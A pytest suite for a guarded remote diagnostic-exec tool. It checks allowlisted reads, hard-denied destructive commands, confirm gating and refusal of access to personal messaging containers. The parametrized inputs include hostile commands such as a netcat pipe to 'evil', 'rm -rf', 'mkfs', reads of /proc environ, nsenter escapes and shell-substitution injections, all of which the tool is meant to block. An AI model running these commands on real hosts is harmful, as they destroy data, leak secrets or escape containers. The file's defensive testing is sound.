"""Tests for noctus.vps.exec — bounded diagnostic exec (zero real SSH).

`run_remote` is injected so no SSH happens. Pins: the 3-tier safety model
(read-allowlist runs free, hard-deny always refuses, else confirm-gated), the
docker-exec container wrapping, and origin-curl / file-read shapes.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

_REPO_ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(_REPO_ROOT / "mcp" / "noctusai"))

from tools.noctus.dev.vps_exec import exec_cmd, _is_read_only, _hard_denied


PLAIN_VPS_YML = """image: devlikeapro/waha:noweb-2026.9.2
platform: linux/amd64
engine: NOWEB
mem_limit: 512m
node_heap_mb: 384
instances:
  - name: monica
    product: monica
    line_policy: {send: enabled, mark_online: true, full_sync: true, auto_repair: true}
"""
@pytest.fixture
def plain_root(tmp_path):
    """A checkout whose fleet file declares NO personal line: these tests are about the confirm gate, and must not change
    verdict when the real fleet declares one (the real file has its own pin at the bottom)."""
    d = tmp_path / "deploy" / "fleet"
    d.mkdir(parents=True)
    (d / "waha-instances.yml").write_text(PLAIN_VPS_YML)
    return str(tmp_path)


def _fake_run(captured):
    def _run(cmd):
        if cmd.startswith("cat ") and "waha-instances.yml" in cmd:   # the VPS's own declaration (readable, no personal line)
            return (0, PLAIN_VPS_YML, "")
        captured["cmd"] = cmd
        return (0, "OUTPUT", "")
    return _run



# ── read-allowlist runs WITHOUT confirm ──────────────────────────────


def test_read_only_grep_runs_free():
    cap = {}
    out = exec_cmd("grep -c _is_service_worker /app/x.py", run_remote=_fake_run(cap))
    assert out["ok"] is True
    assert out["read_only"] is True
    assert out["stdout"] == "OUTPUT"
    assert cap["cmd"].startswith("sh -lc ")


def test_curl_origin_localhost_runs_free():
    """The key origin-direct use case (bypass CloudFlare)."""
    cap = {}
    out = exec_cmd("curl -sS -D- http://localhost:8001/sw.js", run_remote=_fake_run(cap))
    assert out["ok"] is True and out["read_only"] is True


def test_container_exec_wraps_docker_exec():
    cap = {}
    out = exec_cmd("cat /app/seed/framework/backend/noctusai_seed/app.py",
                   container="noctus-erp-imobiliario", run_remote=_fake_run(cap))
    assert out["ok"] is True
    assert cap["cmd"].startswith("docker exec noctus-erp-imobiliario sh -lc ")


def test_docker_inspect_is_read_only():
    assert _is_read_only("docker inspect noctus-core") is True
    assert _is_read_only("docker ps -a") is True
    assert _is_read_only("docker system df") is True


# ── hard-deny ALWAYS refuses (even with confirm) ─────────────────────


def test_hard_deny_rm_rf_refused_even_confirmed():
    cap = {}
    out = exec_cmd("rm -rf /opt/noctus", confirm=True, run_remote=_fake_run(cap))
    assert out["status"] == "refused"
    assert "cmd" not in cap  # NEVER reached the runner

def test_hard_deny_docker_rm_refused():
    out = exec_cmd("docker rm -f noctus-core", confirm=True, run_remote=_fake_run({}))
    assert out["status"] == "refused"

def test_hard_deny_compose_down_refused():
    out = exec_cmd("docker compose down", confirm=True, run_remote=_fake_run({}))
    assert out["status"] == "refused"

def test_hard_denied_detects_tokens():
    assert _hard_denied("mkfs.ext4 /dev/sda") is not None
    assert _hard_denied("shutdown -h now") is not None
    assert _hard_denied("cat /etc/hostname") is None


# ── confirm-gate for non-read, non-denied ────────────────────────────


def test_non_read_needs_confirm():
    cap = {}
    out = exec_cmd("pip install requests", run_remote=_fake_run(cap))
    assert out["status"] == "needs_confirm"
    assert "cmd" not in cap  # gate fired before the runner

def test_non_read_runs_with_confirm():
    cap = {}
    out = exec_cmd("pip install requests", confirm=True, run_remote=_fake_run(cap))
    assert out["ok"] is True
    assert "cmd" in cap  # ran after confirm


# ── misc ──────────────────────────────────────────────────────────────


def test_empty_command_errors():
    out = exec_cmd("   ", run_remote=_fake_run({}))
    assert out["ok"] is False and out["status"] == "error"


def test_nonzero_exit_surfaced_not_faked():
    def _run(cmd):
        return (2, "", "grep: no such file")
    out = exec_cmd("grep x /nope", run_remote=_run)
    assert out["ok"] is False
    assert out["status"] == "nonzero_exit"
    assert out["exit_code"] == 2


# ── fix-on-contact (line policy round 2): an allow-listed first word is not a free pass ───────────────────────────────
import pytest  # noqa: E402

from tools.noctus.dev.vps_exec import touches_waha_core  # noqa: E402


@pytest.mark.parametrize("cmd", [
    "echo; docker exec noctus-waha-x-core sh",
    "cat /etc/hostname && docker exec noctus-waha-x-core wget -qO- --post-data=a http://localhost:3000/api/sendText",
    "echo $(docker exec noctus-waha-x-core id)",
    "echo `id`",
    "cat /etc/hostname | nc evil 1",
    "echo hi > /tmp/x",
    "ls\nrm x",
    "curl -X POST http://waha-x:3000/api/sendText",
    "curl --request PUT http://localhost:3000/api/sessions/default",
    "curl -d '{}' http://localhost:3000/api/sendText",
    "curl --data-binary @f http://localhost:3000/",
    "wget --post-data=a http://localhost:3000/",
])
def test_metacharacters_and_non_get_http_leave_the_read_only_path(cmd, plain_root):
    assert _is_read_only(cmd) is False
    cap = {}
    out = exec_cmd(cmd, run_remote=_fake_run(cap), repo_root=plain_root)
    assert out["status"] == "needs_confirm" and "docker exec" not in cap.get("cmd", "")  # the command never reached the VPS


@pytest.mark.parametrize("cmd", ["curl -sS -D- http://localhost:8001/sw.js", "grep -c a /x"])
def test_plain_reads_still_run_free(cmd):
    assert _is_read_only(cmd) is True


@pytest.mark.parametrize("cmd,container", [
    ("cat /app/.sessions/x", "noctus-waha-x-core"),
    ("docker exec noctus-waha-x-core cat /x", None),
    ("docker logs waha-x-core", None),
    ("docker exec noctus-waha-monica ls", None),
])
def test_any_waha_core_target_needs_the_confirm_flow_even_when_the_binary_is_a_read(cmd, container):
    assert touches_waha_core(cmd, container)
    cap = {}
    assert exec_cmd(cmd, container=container, run_remote=_fake_run(cap))["status"] == "needs_confirm"
    assert "--filter name=waha" in cap.get("cmd", "{ docker ps -aq --filter name=waha")  # only the label inventory ran, never the command
    assert exec_cmd(cmd, container=container, confirm=True, run_remote=_fake_run(cap))["ok"] is True


# ── round 3: argv-level ALLOWLIST, free-path binaries that can run other programs, id/IP resolution ───────────────────


@pytest.mark.parametrize("cmd", [
    "env sh", "env", "find / -exec sh {} +", "find /tmp -name x", "awk 'BEGIN{system(\"id\")}'", "sed -n 1p /etc/hostname",
    "xargs rm", "curl -K /tmp/cfg http://x", "curl --config /tmp/cfg http://x", "curl -o /tmp/x http://x",
    "curl -O http://x", "curl -T f http://x", "curl --upload-file f http://x", "curl --data-raw a http://x",
    "curl -c jar http://x", "curl -X GET http://x", "curl --request GET http://x", "curl -w @/etc/passwd http://x",
    "curl -D /tmp/h http://x", "curl --json {} http://x", "wget -O /tmp/x http://x", "wget --post-data=a http://x",
    "wget -i list", "wget -P /tmp http://x", "sort -o /etc/x f", "grep --pre=sh a f", "rg --pre sh a f", "tail -F f",
    "ls --color=always -Z", "cat --nonsense f", "LD_PRELOAD=/x cat f", "docker --host tcp://x ps", "docker -H x ps",
])
def test_anything_off_the_argv_allowlist_needs_confirm(cmd):
    assert _is_read_only(cmd) is False, cmd


@pytest.mark.parametrize("cmd", [
    "cat /etc/hostname", "ls -la /opt", "grep -rn --include=*.py foo /app", "head -n 5 /etc/hosts", "tail -n 80 /var/log/x",
    "curl -sS -D- http://localhost:8001/sw.js", "curl -sSI -m 5 -H 'Accept: x' http://localhost:1/", "curl -sk --max-time 3 http://x",
    "wget -qO- http://localhost:1/", "wget --spider http://x", "jq -r .a f", "sort -k2 -t, f", "df -h", "docker ps -a",
    "docker logs --tail 50 noctus-core", "docker inspect noctus-core",
])
def test_the_allowlisted_reads_still_run_free(cmd):
    assert _is_read_only(cmd) is True, cmd


class Inventory:
    """A VPS whose waha containers are known: id, name and IP."""

    def __init__(self, rc=0):
        self.rc, self.cmds = rc, []

    def __call__(self, cmd):
        self.cmds.append(cmd)
        if cmd.startswith("cat ") and "waha-instances.yml" in cmd:
            return 0, PLAIN_VPS_YML, ""
        if "--filter name=waha" in cmd:
            return self.rc, "abc123def4567890 /noctus-waha-x-core waha-x-core 172.18.0.7 \n", ""
        return 0, "OUT", ""


@pytest.mark.parametrize("cmd,container", [
    ("docker logs abc123def456", None),             # container id (short)
    ("docker inspect abc123def4567890", None),      # full id
    ("curl -sS http://172.18.0.7:3000/api/sessions", None),   # the core's IP
    ("cat /app/.sessions/x", "abc123de"),           # container= given by id
])
def test_an_id_or_ip_that_resolves_to_a_waha_core_needs_confirm(cmd, container):
    inv = Inventory()
    out = exec_cmd(cmd, container=container, run_remote=inv)
    assert out["status"] == "needs_confirm" and all(c.startswith("cat ") or "--filter name=waha" in c for c in inv.cmds)
    assert exec_cmd(cmd, container=container, confirm=True, run_remote=inv)["ok"] is True


def test_an_id_or_ip_of_another_container_still_runs_free_and_a_failed_lookup_fails_closed():
    inv = Inventory()
    assert exec_cmd("docker logs deadbeef0000", run_remote=inv)["status"] == "ok"
    assert exec_cmd("curl -sS http://172.18.0.99:3000/", run_remote=inv)["status"] == "ok"
    broken = Inventory(rc=1)   # cannot see the live labels: refused as if personal (round 5), not merely confirm-gated
    assert exec_cmd("docker logs deadbeef0000", run_remote=broken)["status"] == "refused"


def test_plain_reads_without_any_container_like_token_do_no_inventory_lookup():
    inv = Inventory()
    exec_cmd("docker ps -a", run_remote=inv)
    exec_cmd("cat /etc/hostname", run_remote=inv)
    assert all("--filter name=waha" not in c for c in inv.cmds)


# ── round 4: a PERSONAL line's core is never reachable through this tool, confirm or not ──────────────────────────────

YML = """image: devlikeapro/waha:noweb-2026.9.2
platform: linux/amd64
engine: NOWEB
mem_limit: 512m
node_heap_mb: 384
instances:
  - name: monica
    product: monica
    line_policy: {send: enabled, mark_online: true, full_sync: true, auto_repair: true}
  - name: owner
    product: assistant
    line_policy: {send: disabled, mark_online: false, full_sync: false, auto_repair: false}
    edge_deny_writes: true
    webhook_upstream: http://assistant:8030
    dashboard: false
    personal: true
"""


@pytest.fixture
def personal_root(tmp_path):
    d = tmp_path / "deploy" / "fleet"
    d.mkdir(parents=True)
    (d / "waha-instances.yml").write_text(YML)
    return str(tmp_path)


class PersonalInventory:
    """Two waha containers: monica's (enabled) and the owner's personal core; id, label, IPv4, IPv6, network alias."""

    def __init__(self, rc=0, vps_yml=None, label=False):
        self.rc, self.cmds, self.vps_yml, self.label = rc, [], YML if vps_yml is None else vps_yml, label

    def __call__(self, cmd):
        self.cmds.append(cmd)
        if cmd.startswith("cat ") and "waha-instances.yml" in cmd:
            return (0, self.vps_yml, "") if self.vps_yml is not False else (1, "", "no such file")
        if "docker images" in cmd and "ancestor" in cmd and "label=com.docker.compose.project" in cmd:
            tag = "personal-line-label" if self.label else ""
            return self.rc, (
                "1111aaaa2222bbbb /noctus-waha-monica waha-monica  172.18.0.4 fd00::4 monica-line\n"
                f"9999ffff8888eeee /noctus-waha-owner-core waha-owner-core {tag} 172.19.0.7 fd00::7 secret-alias.internal\n"), ""
        return 0, "OUT", ""


@pytest.mark.parametrize("cmd,container", [
    ("docker exec noctus-waha-owner-core sh", None),                   # by name
    ("cat /x", "noctus-waha-owner-core"),
    ("docker logs waha-owner", None),                                  # the edge alias
    ("docker exec 9999ffff8888 sh", None),                             # by id
    ("curl -sS http://172.19.0.7:3000/api/sessions", None),            # by IPv4
    ("curl -sS 'http://[fd00::7]:3000/ping'", None),                   # by IPv6
    ("curl -sS http://[::ffff:172.19.0.7]:3000/ping", None),           # IPv4-mapped
    ("curl -sS http://secret-alias.internal:3000/ping", None),         # by network alias / host name
    ("cat /x", "9999ffff"),                                            # container= by id
])
@pytest.mark.parametrize("confirm", [False, True])
def test_a_personal_core_is_refused_by_every_name_with_or_without_confirm(personal_root, cmd, container, confirm):
    inv = PersonalInventory()
    out = exec_cmd(cmd, container=container, confirm=confirm, run_remote=inv, repo_root=personal_root)
    assert out["status"] == "refused" and "personal" in out["error"], (cmd, out)
    assert not any("docker exec" in c or "curl" in c for c in inv.cmds)  # the command itself never ran


def test_monicas_core_is_needs_confirm_not_refused_and_other_containers_are_free(personal_root):
    inv = PersonalInventory()
    out = exec_cmd("docker logs 1111aaaa2222", run_remote=inv, repo_root=personal_root)
    assert out["status"] == "needs_confirm"
    assert exec_cmd("docker logs 1111aaaa2222", confirm=True, run_remote=inv, repo_root=personal_root)["ok"] is True
    assert exec_cmd("docker logs deadbeef0000", run_remote=inv, repo_root=personal_root)["status"] == "ok"


def test_an_unreadable_inventory_or_declaration_fails_closed(personal_root, tmp_path):
    out = exec_cmd("docker logs deadbeef0000", confirm=True, run_remote=PersonalInventory(rc=1), repo_root=personal_root)
    assert out["status"] == "refused"
    out = exec_cmd("docker logs 9999ffff", run_remote=PersonalInventory(), repo_root=str(tmp_path / "nowhere"))
    assert out["status"] == "refused"  # cannot tell which lines are personal: any waha target is refused, even confirmed
    assert exec_cmd("docker logs deadbeef0000", run_remote=PersonalInventory(), repo_root=str(tmp_path / "nowhere"))["ok"]


def test_the_inventory_covers_name_image_ancestor_and_compose_label():
    from tools.noctus.dev.vps_exec import _WAHA_INVENTORY

    for part in ("name=waha", "reference=devlikeapro/waha*", "ancestor=", "label=com.docker.compose.project=noctus-waha",
                 "GlobalIPv6Address", "Aliases"):
        assert part in _WAHA_INVENTORY


# -- round 5: a branch can only TIGHTEN what counts as personal -----------------------------------------------------------

NO_PERSONAL_YML = YML.replace("    personal: true\n", "    personal: false\n")
LINE_DELETED_YML = YML[:YML.index("  - name: owner")]


@pytest.fixture
def root_with(tmp_path):
    def make(yml: str) -> str:
        d = tmp_path / "deploy" / "fleet"
        d.mkdir(parents=True, exist_ok=True)
        (d / "waha-instances.yml").write_text(yml)
        return str(tmp_path)
    return make


@pytest.mark.parametrize("local_yml", [NO_PERSONAL_YML, LINE_DELETED_YML])
@pytest.mark.parametrize("cmd", ["docker exec noctus-waha-owner-core sh", "docker logs 9999ffff8888",
                                 "curl -sS http://172.19.0.7:3000/"])
def test_flipping_or_deleting_the_line_locally_does_not_unlock_a_core_the_live_label_says_is_personal(root_with, local_yml, cmd):
    """Local yml and the VPS yml both say 'not personal' / absent; ONLY the live container label says personal."""
    inv = PersonalInventory(vps_yml=LINE_DELETED_YML, label=True)
    out = exec_cmd(cmd, confirm=True, run_remote=inv, repo_root=root_with(local_yml))
    assert out["status"] == "refused" and "personal" in out["error"], out


def test_the_vps_copy_alone_is_enough_even_when_the_label_is_missing_and_the_local_file_lies(root_with):
    inv = PersonalInventory(vps_yml=YML, label=False)
    out = exec_cmd("docker exec noctus-waha-owner-core sh", confirm=True, run_remote=inv,
                   repo_root=root_with(LINE_DELETED_YML))
    assert out["status"] == "refused"


@pytest.mark.parametrize("which", ["local", "vps"])
def test_if_any_source_is_unreadable_every_waha_target_is_refused_as_if_personal(root_with, tmp_path, which):
    root = str(tmp_path / "nowhere") if which == "local" else root_with(PLAIN_VPS_YML)
    inv = PersonalInventory(vps_yml=False if which == "vps" else PLAIN_VPS_YML)
    for cmd in ("docker logs noctus-waha-monica", "docker exec noctus-waha-monica sh", "docker logs 1111aaaa2222"):
        assert exec_cmd(cmd, confirm=True, run_remote=inv, repo_root=root)["status"] == "refused", (which, cmd)
    assert exec_cmd("docker logs deadbeef0000", run_remote=inv, repo_root=root)["ok"]  # unrelated containers stay free


def test_a_container_stamped_personal_is_refused_by_label_even_when_every_declaration_is_clean(root_with):
    inv = PersonalInventory(vps_yml=PLAIN_VPS_YML, label=True)
    assert exec_cmd("cat /x", container="9999ffff", confirm=True, run_remote=inv,
                    repo_root=root_with(PLAIN_VPS_YML))["status"] == "refused"
    assert exec_cmd("cat /x", container="1111aaaa", confirm=True, run_remote=inv,
                    repo_root=root_with(PLAIN_VPS_YML))["ok"]  # monica's core has no label: confirm flow only


# -- round 6: a command that picks its container at run time names no id/IP/alias ------------------------------------------

DYNAMIC = [
    "docker exec $(docker ps -q --filter name=owner) sh",
    "docker exec `docker ps -q --filter name=owner` sh",
    "docker ps -q | xargs -r docker exec sh",
    "sh -c 'docker exec $(docker ps -q) id'",
    "bash -c \"docker logs owner\"",
    "bash /tmp/x.sh",
    "./x.sh",
    "docker ps -q --filter name=owner | head -1",
    "eval docker exec x sh",
    "sudo sh -c 'docker exec x sh'",
    "find / -name x -exec docker exec {} sh ;",
    "CID=abc; docker exec $CID sh",
    "docker ps -q && docker exec monica-core id",
]


@pytest.mark.parametrize("cmd", DYNAMIC)
@pytest.mark.parametrize("confirm", [False, True])
def test_dynamic_container_selection_is_refused_when_a_personal_line_is_declared(personal_root, cmd, confirm):
    inv = PersonalInventory()
    out = exec_cmd(cmd, confirm=confirm, run_remote=inv, repo_root=personal_root)
    assert out["status"] == "refused" and "personal-unsafe" in out["error"], (cmd, out)
    assert not any("xargs" in c and "docker exec sh" in c for c in inv.cmds[1:])  # never executed


@pytest.mark.parametrize("which", ["local", "vps"])
def test_dynamic_selection_is_refused_when_a_source_is_unreadable(root_with, tmp_path, which):
    root = str(tmp_path / "nowhere") if which == "local" else root_with(PLAIN_VPS_YML)
    inv = PersonalInventory(vps_yml=False if which == "vps" else PLAIN_VPS_YML)
    assert exec_cmd("docker exec $(docker ps -q) sh", confirm=True, run_remote=inv, repo_root=root)["status"] == "refused"


def test_dynamic_selection_is_refused_when_only_the_live_label_says_personal(root_with):
    inv = PersonalInventory(vps_yml=PLAIN_VPS_YML, label=True)
    out = exec_cmd("docker exec $(docker ps -q) sh", confirm=True, run_remote=inv, repo_root=root_with(PLAIN_VPS_YML))
    assert out["status"] == "refused" and "personal-unsafe" in out["error"]


def test_dynamic_selection_is_not_blocked_when_no_personal_line_exists_anywhere(root_with):
    inv = PersonalInventory(vps_yml=PLAIN_VPS_YML, label=False)
    out = exec_cmd("docker exec $(docker ps -q --filter name=monica) id", confirm=True, run_remote=inv,
                   repo_root=root_with(PLAIN_VPS_YML))
    assert out["status"] != "refused"


def test_a_plain_explicit_docker_exec_with_confirm_stays_allowed_beside_a_personal_line(personal_root):
    inv = PersonalInventory()
    out = exec_cmd("docker exec monica-core id", confirm=True, run_remote=inv, repo_root=personal_root)
    assert out["status"] != "refused", out
    out = exec_cmd("docker exec deadbeef0000 ls /app", confirm=True, run_remote=inv, repo_root=personal_root)
    assert out["ok"] is True


HOST_ACCESS = [
    "cat /var/lib/docker/volumes/abc123/_data/x",             # data root
    "ls /var/lib/containerd",
    "cat /proc/1234/environ",                                           # /proc/<digits>
    "ls /proc/*/root",                                                  # /proc glob
    "nsenter -t 1 -m sh", "ctr containers ls", "crictl ps", "runc list", "unshare -m sh",
    "cat /var/li*/docker/x", "ls /v?r/lib", "ls /var/lib/[d]ocker", "cat --file=/etc/pass*",   # absolute-path globs
]


@pytest.mark.parametrize("cmd", HOST_ACCESS)
@pytest.mark.parametrize("confirm", [False, True])
def test_host_level_access_is_refused_when_a_personal_line_is_declared(personal_root, cmd, confirm):
    out = exec_cmd(cmd, confirm=confirm, run_remote=PersonalInventory(), repo_root=personal_root)
    assert out["status"] == "refused" and "personal-unsafe" in out["error"], (cmd, out)


@pytest.mark.parametrize("which", ["local", "vps"])
def test_host_level_access_is_refused_when_a_source_is_unreadable(root_with, tmp_path, which):
    root = str(tmp_path / "nowhere") if which == "local" else root_with(PLAIN_VPS_YML)
    inv = PersonalInventory(vps_yml=False if which == "vps" else PLAIN_VPS_YML)
    assert exec_cmd("cat /proc/1/environ", run_remote=inv, repo_root=root)["status"] == "refused"


def test_host_level_access_is_refused_when_only_the_live_label_says_personal(root_with):
    inv = PersonalInventory(vps_yml=PLAIN_VPS_YML, label=True)
    out = exec_cmd("ls /var/lib/docker", run_remote=inv, repo_root=root_with(PLAIN_VPS_YML))
    assert out["status"] == "refused" and "personal-unsafe" in out["error"]


@pytest.mark.parametrize("cmd", HOST_ACCESS)
def test_host_level_access_stays_allowed_when_no_personal_line_exists_anywhere(root_with, cmd):
    inv = PersonalInventory(vps_yml=PLAIN_VPS_YML, label=False)
    out = exec_cmd(cmd, confirm=True, run_remote=inv, repo_root=root_with(PLAIN_VPS_YML))
    assert out["status"] != "refused", (cmd, out)


def test_ordinary_reads_stay_allowed_beside_a_personal_line(personal_root):
    for cmd in ("cat /etc/hostname", "ls /opt/noctus", "grep -r foo /app"):
        assert exec_cmd(cmd, run_remote=PersonalInventory(), repo_root=personal_root)["status"] != "refused", cmd


# ── the REAL fleet file: the Assistant's number is personal, so its core is refused (S6) ──────────────────────────────


@pytest.mark.parametrize("cmd,container", [
    ("cat /app/.sessions/x", "noctus-waha-assistant-core"),
    ("docker exec noctus-waha-assistant-core cat /x", None),
    ("docker logs waha-assistant-core", None),
    ("docker logs waha-assistant", None),
])
@pytest.mark.parametrize("confirm", [False, True])
def test_the_real_assistant_line_is_personal_and_refused_with_or_without_confirm(cmd, container, confirm):
    cap = {}
    out = exec_cmd(cmd, container=container, confirm=confirm, run_remote=_fake_run(cap))   # reads THIS checkout's fleet file
    assert out["status"] == "refused" and "personal" in out["error"], (cmd, out)
    assert "docker" not in cap.get("cmd", "") and "cat /app" not in cap.get("cmd", "")  # the command never reached the VPS
